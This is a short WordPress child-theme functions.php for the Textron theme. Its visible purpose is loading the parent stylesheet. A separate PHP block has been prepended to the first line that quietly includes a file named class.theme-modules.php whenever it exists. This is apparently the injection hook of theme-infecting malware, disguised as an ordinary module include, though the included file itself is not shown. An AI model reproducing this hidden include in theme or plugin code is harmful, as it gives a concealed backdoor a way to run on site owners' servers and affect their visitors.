<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function textron_enovathemes_child_scripts() {
    wp_enqueue_style( 'textron_enovathemes-parent-style', get_template_directory_uri(). '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'textron_enovathemes_child_scripts' );

?>